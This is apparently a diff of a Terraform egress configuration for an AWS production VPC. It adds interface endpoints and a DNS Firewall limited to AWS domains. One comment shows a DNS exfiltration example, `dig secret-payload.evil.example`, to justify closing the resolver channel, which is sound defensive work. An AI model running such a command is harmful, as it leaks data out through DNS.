@@ -1,19 +1,12 @@
-# production/workloads-egress/ - VPC-Workloads' [E] endpoint slice (Stage 6c step 1.3a,
-# 2026-09-06).
-#
-# The slice is written empty for bookkeeping rather than networking. The rank, the `SLICES` row and
-# this folder land in one commit (Recipe C), so `make down ENV=production` knows about the slice the
-# first time anything is applied into that VPC. An [E] slice nobody destroys is a bill, and that is
-# what a folder arriving after the teardown target was last read produces.
+# production/workloads-egress/ - VPC-Workloads' [E] endpoint slice (Stage 6c step 1.3a): the
+# interface endpoints a Production job calls, and the DNS Firewall (Stage 9 step 3.3a).
 #
 # There is no NAT gateway here, and none anywhere in the estate: under D38 a spoke reaches the
-# internet as a client of the explicit proxy in VPC-Networking rather than through a route.
-#
-# No endpoints until Stage 9/10 names them, and `extra_services = []` is that statement rather than
-# an omission: Stage 9's SageMaker runtime and Stage 10's MWAA Serverless workers decide the list,
-# and MWAA's is a documented set (`logs`, `monitoring`, `kms`) that arrives with a two-AZ
-# requirement - this estate's single D9 exception. Adding endpoints because the other egress slices
-# have them would bill 0.010/h each for a VPC nothing runs in yet.
+# internet as a client of the explicit proxy in VPC-Networking rather than through a route, and this
+# VPC's plane (`production-workloads`) refuses everything by decision. An application image built
+# `FROM base` carries no proxy variable and an isolated job container has no network at all, so a
+# call with no endpoint here never comes back as a proxy 403: it fails at the firewall, in about 2 s
+# (`errno 16`, 6i), and without the firewall it resolves and hangs.
 #
 # foundation/'s [P] facts arrive through terraform_remote_state - never pasted (Lesson 3). Here the
 # state read is `workloads`, not `foundation`: this slice's VPC is VPC-Workloads.
@@ -30,7 +23,7 @@ data "terraform_remote_state" "workloads" {
 
 module "egress" {
   # checkov:skip=CKV_TF_1:pinned by git TAG by convention (conventions §6, Stage 3 step 1.1a) - a repository-internal tag only the repo owner can move
-  source = "git::git@github.com:felipenoris/AWS-DataScience.git//terraform-modules/vpc-egress?ref=vpc-egress-v0.11.1"
+  source = "git::git@github.com:felipenoris/AWS-DataScience.git//terraform-modules/vpc-egress?ref=vpc-egress-v0.17.0"
 
   env    = var.env
   vpc_id = data.terraform_remote_state.workloads.outputs.vpc_id
@@ -40,27 +33,51 @@ module "egress" {
   # No `egress_mode`, `nat_public_subnet_id` or `private_route_table_ids`: under D38 the estate has
   # one internet exit - an explicit proxy in the hub - and no VPC carries a default route, so there
   # is no mode to select and no route table for this slice to write to. What it builds is endpoints
-  # and, where it applies, the DNS Firewall.
+  # and the DNS Firewall.
   endpoint_subnet_id         = data.terraform_remote_state.workloads.outputs.private_subnet_ids[var.zone_ids[0]]
   endpoint_security_group_id = data.terraform_remote_state.workloads.outputs.endpoints_security_group_id
 
-  # This is the one place `core_services` is overridden, and the module's own description reads
-  # "Overridden never - the per-role differences go in extra_services". That was written when every
-  # egress slice served a VPC people work in: the core eight are what a notebook or a runner cannot
-  # function without under design B. This VPC has no workload yet, so the core set is not a floor
-  # here - it is eight interface endpoints at ~0.010/h each, 0.080/h, for a network nothing runs
-  # in. Emptying both lists is what makes 1.3a's "written empty" true, and why this slice's
-  # usd_per_hour is 0.0.
+  # The job-facing set of Stage 9 step 3.3a, at ~0.010/h each. This is the one place
+  # `core_services` is overridden: the module's core eight are what a notebook or a runner cannot
+  # work without, and this VPC holds neither. `sts`, `logs`, `kms` and `glue` stay. `ecr.api` and
+  # `ecr.dkr` leave, because a SageMaker job pulls its image as its role through the service and
+  # never through this VPC (step 3.1). `athena` leaves until a job here queries through it.
   #
-  # Stage 9/10 decides what comes back: MWAA Serverless documents its own set (logs, monitoring,
-  # kms) and the SageMaker runtime will name others. Restoring the core eight wholesale would
-  # inherit a list chosen for a different kind of VPC.
+  # `lakeformation` waits on step 2.4, which decides the job's network first. A Glue job given a
+  # network connection runs in this VPC and calls Lake Formation from it, so that choice puts
+  # `lakeformation` back in this list before the job runs; the job's `vpcEndpointId` reading then
+  # decides whether it stays (Stage 10 step 0.5). Stage 10 step 1.2's worker set joins
+  # `extra_services`, and no optional group is wired until a workload here names one.
   #
-  # Step 5.5 asked for `ssm`/`ssmmessages`/`ec2messages` here and they are absent (2026-09-06). The
-  # step's qualifier excludes this VPC: it says every instance-bearing spoke, and VPC-Workloads
-  # bears none - measured, Production's only two instances are in VPC-Networking. Adding them would
-  # be 0.030/h of Session Manager path for a network with nothing to manage. They arrive with the
-  # first workload, from Stage 9/10, beside the rest of that list.
-  core_services  = []
-  extra_services = []
+  # Session Manager's three stay out: 6c step 5.5 asks for them in an instance-bearing spoke, and
+  # this VPC holds no instance.
+  core_services  = ["sts", "logs", "kms", "glue"]
+  extra_services = ["sagemaker.api", "secretsmanager"]
+
+  # The firewall closes the VPC resolver as an exfiltration channel (6c step 5.7), which exists
+  # wherever code runs, with or without a route: `dig secret-payload.evil.example` leaves through
+  # the resolver one label at a time.
+  dns_firewall = true
+
+  # TRUST, as in the two other firewalled VPCs: every entry below is an AWS namespace, so AWS points
+  # the chain beneath it.
+  firewall_domain_redirection_action = "TRUST_REDIRECTION_DOMAIN"
+
+  # AWS namespaces only (step 3.3a). Each of the six endpoints answers for
+  # `<service>.<region>.amazonaws.com` and its `.api.aws` twin, plus `streaming-logs` for `logs`
+  # (measured on Sandbox's endpoints, 2026-09-09), and the S3 gateway's names are under
+  # `amazonaws.com` too. The apex sits beside each wildcard because a domain-list wildcard never
+  # matches the apex, and every entry carries the trailing dot of EXC-04's repair.
+  #
+  # The estate's private zones are not here, so `gitlab.awsds.internal`, `proxy.awsds.internal` and
+  # every `prod.awsds.internal` name answer NXDOMAIN in this VPC: GitLab sits in VPC-SharedServices,
+  # which this VPC has no peering to, and the proxy refuses this plane everything. A name a job
+  # needs under `prod.awsds.internal` joins the list with it.
+  #
+  # The module names the query log group `/awsds/<env>/dns-firewall`, without the suffix;
+  # production/egress carries no firewall, so the name is free in this account.
+  dns_firewall_allow_domains = [
+    "amazonaws.com.", "*.amazonaws.com.",
+    "api.aws.", "*.api.aws.",
+  ]
 }
